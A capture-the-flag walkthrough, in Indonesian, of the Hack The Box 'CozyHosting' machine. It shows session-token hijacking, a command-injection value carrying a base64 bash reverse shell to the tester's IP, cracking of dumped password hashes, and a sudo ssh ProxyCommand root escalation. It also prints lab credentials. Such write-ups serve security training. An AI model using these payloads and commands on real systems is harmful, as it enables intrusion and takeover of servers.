# **WRITE UP COZY HOSTING**

_**VPN CONFIGURATION**_

Pertama-tama, server dari Cozy Hosting harus dihubungkan dengan mendownload VPN terlebih dahulu, kemudian hubungkan VPN yang sudah terdownload

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/4cac17ac-afb7-41b3-b7ba-63b0d67c67aa)

Setelah dihubungkan, start mesin CozyHosting untuk mendapatkan IP dari target machine

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/cea056ef-4223-4bce-aeba-fb57d9879949)

Setelah mendapatkan IP address dari target, maka kita akan menggunakan nmap untuk mengscan IP target untuk mengetahui port mana saja yang terbuka dengan command:

`nmap 10.10.11.230 -p- -sV`

memberikan hasil seperti berikut

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/420c7e52-38f2-4aab-b5f4-ab5f4f283165)

Namun sebelum masuk ke dalam port tersebut, kita perlu menambahkan host dari HTB ke dalam kali linux dengan command:

`sudo nano /etc/hosts`

Dan ditambahkan seperti dibawah

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/ee896dc2-d29b-4ca3-9321-3c22853c8aa5)

Setelah ditambahkan, maka saya akan masuk ke dalam port hasil dari scan nmap dan menemukan web page seperti dibawah pada port 80

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/ef029043-6b86-408f-8290-d8704e4bd8b2)

_**WEB ENUMERATION**_

Dikarenakan kerentanan dari sebuah web biasanya adalah dengan adanya directory yang dapat memberikan kunci ataupun clue selanjutnya, maka saya melakukan directory search dengan menggunakan dirsearch dengan:

`dirsearch -u http://cozyhosting.htb -x 403,404 -t 50`

Saya meng exclude status 403 dan 404 dikarenakan directory yang berjalan dalam status itu tidak dapat dibuka sehingga hasil dari dirsearch nantinya tidak terlalu banyak dan akan lebih rapi, saya juga men set thread pada 50 karena saya ingin mempercepat proses dirsearch dan memberikan hasil seperti dibawah

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/3e6e00f1-8ec5-4d61-bdfc-9c0649407feb)

Dari hasil dirsearch diatas, setelah dicoba coba, terdapat 2 directory yang menarik perhatian saya yaitu `/actuator/sessions` dan `/login`.

Dari directory `/actuator/sessions` saya mendapatkan token session yang dapat digunakan nantinya.

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/0bb5db5c-9cfb-4dc7-9b93-aa9610763022)

Dan pada directory /login terdapat login page seperti gambar dibawah

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/982f5c4d-4ae5-42e1-9faf-9b6291c390c7)

_**SESSION HIJACKING**_

Dikarenakan credentials untuk login masih blm didapatkan, maka kita akan menggunakan burpsuite untuk mendapatkan akses. Saya menggunakan extension foxyproxy pada firefox yang saya gunakan agar dapat terkoneksi langsung dengan burpsuite pada saat website dijalankan. Untuk settingan yang digunakan seperti yang dibawah

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/85d9fb76-ad79-4da7-b050-6c59df72ca75)

Apabila sudah di setting, maka saya akan masukkan username dan password asal agar dapat menerima request website pada burpsuite, setelah menerima request website, saya menemukan cookie session dari website  yang dapat diubah ubah

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/16391e51-ab35-4397-aa2e-7dab0724a7a4)

langsung saya coba masukkan url website dengan ditambahkan `/admin` menjadi `cozyhosting.htb/admin` , kemudian mengganti token session sebelum dengan menggunakan token dibawah.

(note: token gambar dibawah berbeda dengan gambar diatas dikarenakan pada saat memasukkan token, terdapat beberapa kali kegagalan sehingga token yang digunakan berubah ubah)

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/2854fb3d-71eb-4d76-b29d-032a1c278cb2)

Maka yang sebelumnya cookie seperti dibawah ini

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/a9039c48-b071-4ecc-86c9-2f6125322c02)

Dengan menggunakan cookie yang diambil dari /session maka cookie sebelum diganti menjadi cookie yang didapatkan

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/41ed33a4-fbc2-4f63-8cd4-168db67001e7)

Kemudian setelah di forward dan di enter pada web page, maka akan masuk kedalam admin page

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/7665f2ae-4cb4-403f-b8d4-2e47bfe0e4e6)

Setelah masuk ke dalam admin page, terdapat box hostname dan username, disitu saya mengisi hostname dengan cozyhosting.htb dan username test yang kemudian di submit agar dapat mengecek request dari web yang akan ditangkap oleh burpsuite seperti gambar dibawah

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/997f9498-c469-43c9-9ebf-9c11ec2ec886)

Lalu request yang diberikan dari website dikirim ke repeater untuk dilakukan testing seperti hasil dibawah berikut

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/a2b5dcdb-8aab-4d1e-bfb4-6cde4fd93c14)

_**REVERSE SHELL**_

Dari hasil ini maka cara yang dapat kita ambil untuk mengambil alih suatu server adalah dengan menggunakan reverse shell, maka website yang dapat digunakan adalah [revshells](https://www.revshells.com/) agar dapat menggenerate payload

Dengan memasukkan IP VPN yang diberikan dan port yang kita mau dengar maka akan menghasilkan base64 seperti berikut

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/e9add872-b0de-432a-b4d8-ac05449f6c4a)

Lalu base64 tersebut dicopy dan dimasukkan ke dalam payload kemudian username yang sebelumnya `test` diganti menjadi payload `;echo${IFS}"c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNDAvODAwMCAwPiYx"|base64${IFS}-d|bash;`
seperti gambar dibawah

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/7b10ef6a-9e86-4ee3-89b7-f357bb00e708)

Lalu di terminal, saya menggunakan command netcat dan mencantumkan port yang mau kita dengar sehingga commandnya menjadi:

`nc -lvnp 8000`

Setelah meng netcat di terminal, maka saya akan send request dari repeater burpsuite, maka akan memberikan hasil seperti berikut

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/b97c1fa6-60df-4c9c-9320-45c88db9d127)

Kemudian, saya menjalankan command ls untuk melihat isi file dalam server dan dapat ditemukan  file `cloudhosting-0.0.1.jar`

Agar dapat mendownload file tersebut maka dilakukan command `python3 -m http.server 12345` untuk menjalankan server python yang kemudian dapat dibuka pada browser seperti dibawah

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/fe33d052-25fc-4070-9380-b6777ed712d2)

Setelah file jar di download, untuk membuka isi dari file tersebut, saya menggunakan website jdec.app lalu file diupload ke dalam web nya

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/674996f7-09d5-421c-81b8-48eae522764b)

Setelah di upload maka saya mengecek satu satu root dari file tersebut dan menemukan sebuah password yang dapat digunakan untuk user postgres pada `application.properties` yang mungkin dapat digunakan untuk melakukan SSH credential (contoh ada pada gambar dibawah)

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/3fc9b532-6d42-40a0-ae72-208110c15f9d)

Kemudian di dalam server, saya menggunakan command: 

`psql -U postgres -W Vg&nvzAQ7XxR`

yang dimana memberikan error, namun karena error tersebut, saya menemukan port dimana postgres dijalankan

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/a51e6142-94a1-4fcc-a04c-00788c5b508e)

Maka kemudian saya coba lagi dengan menggunakan command:

`psql -h 127.0.0.1 -p 5432 -U postgres`

dan menggunakan password untuk user postgres yang ditemukan sebelumnya

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/39f2fc3e-bb02-4ba2-add7-befc0ec0f968)

Yang kemudian memberikan saya akses kedalam databasenya

Kemudian dengan mencari di google dan ditemukan web yaitu https://www.commandprompt.com/education/postgresql-basic-psql-commands/ yang dimana memberikan basic psql command pada postgres, maka langsung dijalankan command \l untuk melihat semua list dari database

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/ba29c43a-4882-42f3-ac4b-f9fbaf101c7e)

Lalu database dikoneksikan dengan menggunakan command:

`psql -d cozyhosting -U postgres`

yang setelah itu dilanjutkan dengan command \dt untuk menglist semua tabel dan memberikan hasil seperti berikut

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/a0961877-aa50-4e1b-89a2-448842ecb8ae)

Pada saat saya mencoba table ‘users’ dengan menggunakan command:

`select *from users;`

untuk menglist semua data yang ada di users saya mendapatkan hash password seperti gambar dibawah

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/856b3487-98e8-4321-b26e-3f482a26d3f4)

Lalu dengan adanya password yang perlu di crack, maka saya menggunakan `john the ripper` untuk mengcrack password dengan wordlist `rockyou.txt` dengan command

`john --wordlist=/usr/share/wordlists/rockyou.txt pass`

maka menghasilkan password dibawah ini

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/f0eb4766-e257-4e9f-888f-657e78621d9f)

Kemudian saya mencoba melakukan ssh kembali pada `postgres@10.10.11.230` dengan command:

`ssh  postgres@10.10.11.230`

dan password manchesterunited yang saya temukan namun hanya menghasilkan error

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/84370662-c3ad-4809-9a8e-0dd350a73e53)

Karena error tersebut saya coba melakukan reverse shell lagi dengan payload dan port yang sama, kemudian saya lakukan command `pwd` untuk mengjetahui posisi directory saya

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/c638943b-7892-4e40-b10e-358b76844fc6)

Setelah melakukan command `pwd` dan mengetahui posisi directory ternyata bukan di home, saya langsung menggunakan command `cd ..` untuk mundur ke directory sebelumnya hingga saya sampai pada directory home, kemudian saya coba command `ls` dan ditemukan berbagai macam directory

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/d4344c04-398f-4772-976e-86e416f620fa)

Kemudian saya coba satu satu dari semua directory tersebut dan saat masuk ke dalam directory home, saya menemukan nama `josh`

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/de00def6-0f26-43fc-8a22-7444af39a9bd)

Kemudian saya coba lagi ssh dengan menggunakan nama `josh` dan password `manchester united` dan berhasil masuk ke dalam server sebagai user josh

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/0047c503-974c-464b-a1ee-3a0cc35c6dea)

Lalu saya mencoba `ls` untuk melihat ada file apa saja dalam server josh dan menemukan `file user.txt` yang kemudian saya cat file tersebut dan ditemukan flag dari user

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/0da425dd-6db8-4792-92e1-3627514b8746)

Lalu setelah mengetahui ternyata user josh dapat dinaikan privilege usernya, dengan mendapatkan command dari website [gtfobins](https://gtfobins.github.io/gtfobins/ssh/) saya dapat menaikkan privilege user josh menjadi root dengan menggunakan command:

`sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x`

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/71fab3fb-bcb3-4b7b-a83d-389c1718c259)

Setelah itu saya mencoba `pwd` lagi untuk mengetahui file directory dimana saya berada dan mencoba untuk balik ke directory home dengan menggunakan command `cd ..`

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/3d4bd34b-7146-4135-8733-df49dd4031b5)

Lalu karena saya kurang yakin saya sudah balik sepenuhnya ke directory home, saya menggunakan command  `cd~` agar kembali ke directory paling asal (directory home), setelah sampai di directory home,  saya coba melakukan command ls dan ditemukan file `root.txt`

Kemudian file tersebut saya `cat` dan ditemukan flag dari root

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/de624548-5793-49cd-9762-69d7af2a8b78)

![image](https://github.com/Bepe2306/Hack-The-Box-HTB-/assets/153899054/1a3ac57d-d7f3-4c72-a61c-f0bd51ed44bd)
